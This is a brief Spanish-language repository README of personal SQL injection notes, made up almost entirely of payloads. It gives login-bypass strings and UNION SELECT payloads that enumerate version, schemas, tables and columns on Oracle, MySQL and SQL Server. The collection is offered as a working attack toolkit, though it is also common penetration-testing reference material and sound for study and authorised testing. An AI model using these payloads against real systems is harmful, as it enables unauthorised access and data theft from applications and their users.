# SQL Injection
En este repositorio incluire mis notas de sql injection y algunos payloads utilizados por mi.

## Payloads de autenticación
```sql
abc' or 1=1-- -
abc' or 1=1#
abc' or '1'='1
```
## Recopilar información de la base de datos
### Version
#### Oracle
```sql
' union select BANNER,null from v$version-- -
' union select VERSION,null from V$INSTANCE-- -
```
#### MySQL
```sql
' union select @@version,null-- -
' union select VERSION(),null-- -
```
#### Microsoft SQL Server
```sql
' union select @@version,null-- -
' union select SERVERPROPERTY('productversion'),null-- -
```
### Bases de datos
#### Non-Oracle
```sql
' union select null,DISTINCT(SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA-- -
```
#### Oracle
```sql
' union select null,DISTINCT(USERNAME) FROM ALL_USERS-- -
```
### Tablas
#### Non-Oracle
```sql
' union select null,table_name FROM information_schema.tables-- -
```
#### Oracle
```sql
' union select null,table_name from all_tables-- -
```
### Columnas
#### Non-Oracle
```sql
' union select null,column_name FROM information_schema.columns where table_name='NOMBRE DE LA TABLA'-- -
```
#### Oracle
```sql
' union select null,column_name from all_tab_columns where table_name='NOMBRE DE LA TABLA'-- -
```


